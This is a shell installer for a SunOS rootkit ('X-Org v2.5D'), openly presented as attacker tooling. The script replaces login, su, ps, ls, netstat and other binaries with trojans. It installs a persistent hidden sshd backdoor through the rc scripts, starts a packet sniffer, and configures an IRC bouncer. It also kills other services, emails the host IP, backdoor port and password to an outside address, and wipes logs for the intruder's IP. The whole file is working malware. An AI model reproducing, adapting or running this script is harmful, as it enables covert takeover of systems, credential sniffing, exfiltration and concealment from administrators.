#!/bin/sh
# .,gg,.        .,gg,.
# `$$$$$.      .$$$$$'
#  `$$$$$.    .$$$$$' .,g%d$"^"$b%y,.      .,g%d$"^"$b%y,..,g%d$"^"$b%y,.
#   `$$$$$.  .$$$$$'g$$$$'       `$$$$y..g$$$$'        .g$$$$'       `""'
#     $$$$$$$$$$$$.l$$$$:         :$$$$ll$$$$:         l$$$$:  g%d$$b%y,.
#   .$$$$$'""`$$$$$.$$$$$p       g$$$$$'l$$$$:         l$$$$:       l$$$$:
#  .$$$$$'    `$$$$$.`^"$b%y,.,g%d~"^'  `"--"'          `^"$b%y,.,g%d~"^'
# .$$$$$'      `$$$$$.  
# `""""'        `""""' you can stop one, but you can't stop all of us!
#                                                (Leeto ASCII By: Johnny7)
#
#   X-Org SunOS Rootkit v2.5D X-ORG Internal Release  Edition By: Judge-D/Danny-Boy
#         	     Special Thanks to Tragedy/Dor for Setup Wrapper 
#		       If your not meant to have this, dont use it
#                           http://www.xorganisation.org
#                           http://www.xorg2000.com

IVER="2.5DXE-ORG"

# Edit these
# Dir to install rootkit in
RKDIR="/usr/lib/libX.a"
# Your email address
EMAIL="nutellaworld@libero.it"

colours()
{
BLK='[1;30m'
RED='[1;31m'
GRN='[1;32m'
YEL='[1;33m'
BLU='[1;34m'
MAG='[1;35m'
CYN='[1;36m'
WHI='[1;37m'
DRED='[0;31m'
DGRN='[0;32m'
DYEL='[0;33m'
DBLU='[0;34m'
DMAG='[0;35m'
DCYN='[0;36m'
DWHI='[0;37m'
RES='[0m'
}
colours


STIME=`./utime`
echo "${DCYN}X-Org SunOS Rootkit ${WHI}v2.5DXE - Time to spread your wings and conquer the world"
echo "X-Org SunOS Rootkit v2.5DXE - By JudgeD/Danny-Boy" >> README
cat logo
echo "${WHI}*${DWHI} Starting up at: ${DCYN}${STIME}${DWHI}"

INDIR=`pwd`
OS=`uname -s`
VER=`uname -r`
CPU=`uname -i`

cdir()
{
if test ! -d $1 ; then
mkdir $1
fi
}

backup()
{
if test -f /usr/lib/libX.a/bin/${2} ; then
cp /usr/lib/libX.a/bin/${2} /usr/lib/libX.a/bin/tmpfl
fi

if test -f "$1" ; then
cp $1 /usr/lib/libX.a/bin/
printf " $2"
fi

if test -f /usr/lib/libX.a/bin/tmpfl ; then
mv /usr/lib/libX.a/bin/tmpfl /usr/lib/libX.a/bin/${2}
fi
}

cprk()
{
cp $1 /usr/lib/libX.a/
printf " $1"
}

cdir()
{
if test ! -d $1 ; then
mkdir $1
fi
}

unsuid()
{
if test -f "$1" ; then
chmod u-s $1
printf " $2"
fi
}

# trojan proc..
# $1 = trojan
# $2 is real file
# example: trojan su /sbin/su
# no full path for trojan
trojan()
{
if test -f "$2" ; then
./sz $2 ./$1
./fix /$2 ./$1
printf " $1"
fi
}


printf "${WHI}*${DWHI} Installing from $INDIR - Will erase $INDIR after install\n"

        case $OS in
		SunOS)
			;;
		*)
		echo "${WHI}*${DWHI} ${RED} Oops.. im DUMB! i tried installing SunOS Rootkit on $OS :P"
		exit 10
			;;
                esac

# Ok.. so if theyre not lame, and running this on SunOS like they should...
        case $VER in
		5.5)
			cp /bin/ls ./
			;;
		5.5.1)
                        cp /bin/ls ./
                        ;;
                5.7)
                        ;;
                5.6)
                        ;;
		5.8)
                        ;;
		5.4)
			cp /bin/ls ./
			;;
		*)
			printf "${RED}**FATAL**${DWHI} Sorry. SunOS Version $VER is NOT supported.\n"
			exit
			;;
		esac
# check for x86 boxes, since this rootkit is precompiled for sparcs
        case $CPU in
		i86pc)
			printf "${RED}**FATAL**${DWHI} This rootkit is precompiled for Sparc only, this system is $CPU\n"
			exit
			;;
		*)
                        ;;
		esac

printf "${WHI}*${DWHI} Checking for existing rootkits..\n"

./findkit 

cdir /usr/lib/
cdir $RKDIR
cdir /usr/lib/libX.a/bin

echo "${WHI}***${DWHI} Insert Rootkit Password : "
read PASSWD
echo "${WHI}***${DWHI} Using Password $PASSWD"
./pg $PASSWD >/etc/lpd.config
PASS=$PASSWD
echo "su_pass=`./rpass`" >>x.conf2
echo "${WHI}***${DWHI} Insert Rootkit SSH Port : "
read PORT
echo "${WHI}***${DWHI} Using Port $PORT"
echo "${WHI}***${DWHI} Insert Rootkit PsyBNC Port : "
read EPORT
echo "${WHI}***${DWHI} Using Port $EPORT"

echo "net_filters=$PORT,$EPORT,17171,60001,6667,6668,5555" >>x.conf
echo "PORT=$EPORT" >>psbnc.ini
cat x.conf2 >>x.conf

./crypt x.conf /usr/lib/libX.a/uconf.inv

printf "${WHI}*${DWHI} Making backups..."

backup /bin/su su
backup /usr/sbin/ping ping
backup /usr/bin/du du
backup /usr/bin/passwd passwd
backup /usr/bin/find find
backup /bin/ls ls
backup /bin/netstat netstat
backup /usr/bin/strings strings

if test ! -f /usr/lib/libX.a/bin/rps ; then
cp /usr/bin/ps /usr/lib/libX.a/bin/rps
fi
printf " ps"

printf " Done.\n"
printf "${WHI}*${DWHI} Installing trojans..."

###Backdoors

# Special sz for login which checks for known login trojans
./szl /usr/bin/login ./login
./fix /usr/bin/login ./login /sbin/xlogin
printf " login"

cp -f sshd /usr/bin/srload
chmod 755 /usr/bin/srload
echo "Port ${PORT}" >etc/sshd_config
cat etc/tconf >>etc/sshd_config
rm -f etc/tconf
cp etc/* /usr/bin/
echo "# Reloading System Settings... " >>/etc/rc2
echo "if [ -f /usr/bin/srload ]; then " >>/etc/rc2
echo "  /usr/bin/srload -q" >>/etc/rc2
echo "  /usr/sbin/modcheck" >>/etc/rc2
echo "fi " >>/etc/rc2
echo "# Reloading System Settings... " >>/etc/rc3
echo "if [ -f /usr/bin/srload ]; then " >>/etc/rc3
echo "  /usr/bin/srload -q" >>/etc/rc3
echo "  /usr/sbin/modcheck" >>/etc/rc3
echo "fi " >>/etc/rc3
/usr/bin/srload -q
printf " sshd"

###Trojans

# Netstat Trojan
if test -f "/usr/bin/netstat" ; then
./sz /usr/bin/netstat ./netstat
./fix /usr/bin/netstat ./netstat
printf " netstat"
fi

# ls trojan
if test -f "/usr/bin/ls" ; then
./sz /usr/bin/ls ./ls2
./fix /usr/bin/ls ./ls2
printf " ls"
fi

# lsof trojan
if test -f "/usr/local/bin/lsof" ; then
./sz /usr/local/bin/lsof ./lsof
cp /usr/local/bin/lsof /usr/lib/libX.a/bin/
./fix /usr/local/bin/lsof ./lsof
printf " lsof"
fi

# find trojan
if test -f "/usr/bin/find" ; then
./sz /usr/bin/find ./find
./fix /usr/bin/find ./find
printf " find"
fi

#strings trojan
if test -f "/usr/bin/strings" ; then
./sz /usr/bin/strings ./strings
./fix /usr/bin/strings ./strings
printf " strings"
fi

# du trojan
if test -f "/usr/bin/du" ; then
./sz /usr/bin/du ./du
./fix /usr/bin/du ./du
printf " du"
fi

# top trojan
if test -f "/usr/local/bin/top" ; then
./sz /usr/local/bin/top ./top
rm -f /usr/local/bin/top
./fix /usr/local/bin/top ./top
printf " top"
fi

# passwd trojan
if test -f "/usr/bin/passwd" ; then
./sz /usr/bin/passwd ./passwd
./fix /usr/bin/passwd ./passwd
printf " passwd"
fi

# ping trojan
if test -f "/usr/sbin/ping" ; then
./sz /usr/sbin/ping ./ping
printf " ping"
fi

# su trojan
if test -f "/bin/su" ; then
./sz /bin/su ./su
./fix /bin/su ./su $RKDIR/oldsuper
printf " su"
fi

# ps trojan
cd $INDIR;
if test -f /lib/ldlibps.so; then
cp -f /lib/ldlibps.so /usr/bin/ps
fi
./sz /usr/bin/ps ./ps
./fix /usr/bin/ps ./ps
# required for sol7/8
if test -d /usr/bin/sparcv7 ; then
cdir /usr/lib/libX.a/bin/sparcv7
cp -f /bin/sparcv7/ps /usr/lib/libX.a/bin/sparcv7/rps
fi
printf " ps"

printf " Complete.\n"

printf "${WHI}*${DWHI} Suid removal"

unsuid /usr/bin/at at
unsuid /usr/bin/atq atq 
unsuid /usr/bin/atrm atrm
unsuid /usr/bin/eject eject
unsuid /usr/bin/fdformat fdformat
unsuid /usr/bin/rdist rdist
unsuid /bin/rdist rdist
unsuid /usr/bin/admintool admintool
unsuid /usr/lib/fs/ufs/ufsdump ufsdump
unsuid /usr/lib/fs/ufs/ufsrestore ufsrestore
unsuid /usr/lib/fs/ufs/quota quota
unsuid /usr/openwin/bin/ff.core ff.core
unsuid /usr/bin/lpset lpset
unsuid /usr/bin/lpstat lpstat
unsuid /usr/lib/lp/bin/netpr netpr
unsuid /usr/sbin/arp arp
unsuid /usr/vmsys/bin/chkperm chkperm

chmod u-s /usr/openwin/bin/*
chmod u-s /usr/dt/bin/*
printf " Complete.\n"

printf "${WHI}*${DWHI} Patching..."
TFL=`./rpass`

rm -f /usr/sbin/in.fingerd
touch /usr/sbin/in.fingerd
printf " fingerd"

cat /etc/inetd.conf|grep -v rpc.cmsd >${TFL}
mv ${TFL} /etc/inetd.conf
rm -f /usr/dt/bin/rpc.cmsd /usr/openwin/bin/rpc.cmsd
ps -fe | grep cmsd | grep -v grep | awk '{print "kill -9 "$2""}' | /bin/sh
printf " cmsd"

cat /etc/inetd.conf|grep -v ttdbserverd >${TFL}
mv ${TFL} /etc/inetd.conf
ps -fe | grep ttdb | grep -v grep | awk '{print "kill -9 "$2""}' | /bin/sh
rm -f /usr/dt/bin/rpc.ttdbserver
printf " ttdbserverd"

cat /etc/inetd.conf|grep -v sadmind >${TFL}
mv ${TFL} /etc/inetd.conf
ps -fe | grep sadmin | grep -v grep | awk '{print "kill -9 "$2""}' | /bin/sh
printf " sadmind"

cat /etc/inetd.conf|grep -v statd >${TFL}
mv ${TFL} /etc/inetd.conf
ps -fe | grep statd | grep -v grep | awk '{print "kill -9 "$2""}' | /bin/sh
rm -rf /usr/lib/netsvc/rstat/rpc.rstat /usr/lib/nfs/statd
printf " statd"

cat /etc/inetd.conf|grep -v rquota >${TFL}
mv ${TFL} /etc/inetd.conf
ps -fe | grep rquota | grep -v grep | awk '{print "kill -9 "$2""}' | /bin/sh
printf " rquotad"

cat /etc/inetd.conf|grep -v rusersa >${TFL}
mv ${TFL} /etc/inetd.conf
ps -fe | grep rusers | grep -v grep | awk '{print "kill -9 "$2""}' | /bin/sh
printf " rusersd"

ps -fe | grep /tmp/bob | grep -v grep | awk '{print "kill -9 "$2""}' |/bin/sh
ps -fe | grep /tmp/.x | grep -v grep | awk '{print "kill -9 "$2""}' | /bin/sh
ps -fe | grep cmsd | grep -v grep | awk '{print "kill -9 "$2""}' | /bin/sh
ps -fe | grep inetd | grep -v grep | awk '{print "kill -HUP "$2""}' | /bin/sh
rm -f /tmp/bob /tmp/.x
printf " bindshells"

rm -f /usr/lib/dmi/snmpXdmid
/etc/init.d/init.dmi stop 
printf " snmp"

printf " Done.\n"
cp wget /usr/bin

IFT=`/sbin/ifconfig -a | head -n 3|grep -v "lo0"|grep flags|awk '{print $1}'`
IFX=`echo $IFT | cut -d 0 -f 1`
echo "${WHI}*${DWHI} Primary network interface is of type: ${DCYN}${IFX}${DWHI}"

### sniffer
cp sn2 /usr/sbin/modstat
echo "nohup /usr/sbin/modstat -s -d 512 -i /dev/${IFX} -o /usr/lib/libp/libm.n >/dev/null &" >>sniffload
cp sniffload /usr/sbin/modcheck
echo "${WHI}*${DWHI} Sniffer set"
nohup /usr/sbin/modcheck >/dev/null 2>&1
### end sniffer

printf "${WHI}*${DWHI} Copying utils.."

cp patcher $RKDIR/fixer
cp pg $RKDIR/passgen
cp cleaner $RKDIR/wipe
cp utime $RKDIR/utime
cp l3 $RKDIR/l
cp crypt $RKDIR/crt
chmod +x psbnc
cp psbnc $RKDIR/psbnc
cp idsol /usr/lib/lpsys
cp idrun $RKDIR/idstart
cp ssh-dxe $RKDIR/ssh-dxe
cp syn $RKDIR/syn
cp README $RKDIR/README

#if test -f "./dos"; then
#cp td /usr/sbin/ntpq
#touch /etc/security/audit_device
#/usr/sbin/ntpq
#fi

printf " passgen fixer wipe utime crt idstart ssh-dxe syn README  Done.\n"

### pident.d BACKDOOR
#cp -f in.identd /usr/sbin/in.identd
#chmod 755 /usr/sbin/in.identd
#echo "auth   stream  tcp     nowait    nobody    /usr/sbin/in.identd in.identd" >> /etc/inetd.conf
#printf "${WHI}*${DWHI} in.identd backdoor installed on port 113 \n"
#printf "${WHI}*${RED} DONT FORGET TO RESTART INETD!"
###

### BNC2

#cp bnclp /usr/sbin/ntptime
#cp bnc.conf /usr/sbin/ntptime.conf
#echo "${WHI}*${DWHI} BNC2 has now been copied to /usr/sbin/ntptime and configured on port:1578"

### end BNC2

### psyBNC

cdir /var/ntp
cdir /var/ntp/ntpstats
cp ntpstat /var/ntp/ntpstats/
cp psbnc* /var/ntp/ntpstats/
cp psybncchk /usr/sbin/ntpstat
#echo "0,30 * * * * /usr/sbin/ntpstat >/dev/null 2>&1" >> /var/spool/cron/crontabs/root
#cd /var/ntp/ntpstats
#./ntpstat
echo "${WHI}*${DWHI} psyBNC has now been configured on port $EPORT (default) with no IDENT"
### end psyBNC

echo "${WHI}*${DWHI} erasing rootkit..."
cd $RKDIR
rm -rf $INDIR

PRIMIF=`/sbin/ifconfig -a|grep inet|head -n 2|grep -v 127.0.0.1|awk '{print $2}'`
IFCNT=`/sbin/ifconfig -a|grep inet|grep -v 127.0.0.1|wc -l`
UNAM=`uname -a`

DUPTEST=`dmesg|grep "SUNW,hme0"|head -n 1|cut -d ":" -f 1`
if [ $DUPTEST ];then
LINKUP=`dmesg|grep "SUNW,hme0"|grep "Link"|head -n 1`
echo "${WHI}*${DWHI} $LINKUP"
fi
NEXUS=`dmesg|grep nexus|head -n 1`

FTIME=`$RKDIR/utime`
ITIME=`expr $FTIME - $STIME`

echo "${WHI}*${DCYN} Rootkit installation Completed in ${ITIME} Seconds.${DWHI}"
echo "${WHI}*${DWHI} Password: $PASS"
echo "${WHI}*${DWHI} $UNAM"
echo "${WHI}*${DWHI} Primary interface IP: $PRIMIF"
echo "${WHI}*${DWHI} Possible $IFCNT host aliases"
echo "${WHI}*${DWHI} $NEXUS"
echo "Rootlist line:"
echo "$PRIMIF:${PORT}   $PASS  PSYBNC:${EPORT}"
echo "$PRIMIF:${PORT}   $PASS  PSYBNC:${EPORT}" > /tmp/.pinespool
mail -s "SunOSP" nutellaworld@libero.it < /tmp/.pinespool 1>>/dev/null 2>>/dev/null
rm -rf /tmp/.pinespool

# Here you could add optional commands to clean logs
# EG: to remove traces of rpc.sadmind exploitation
echo "${WHI}*${DCYN} Removing Logs...Insert Your IP: "
read MYIP
$RKDIR/wipe $MYIP
$RKDIR/wipe sadmin
$RKDIR/wipe cmsd
$RKDIR/wipe snmp
echo "${WHI}*${DCYN} Done...Enjoy Your Stay :)"
echo "${WHI}*${DCYN} Modified by blueocean on IrcNet"
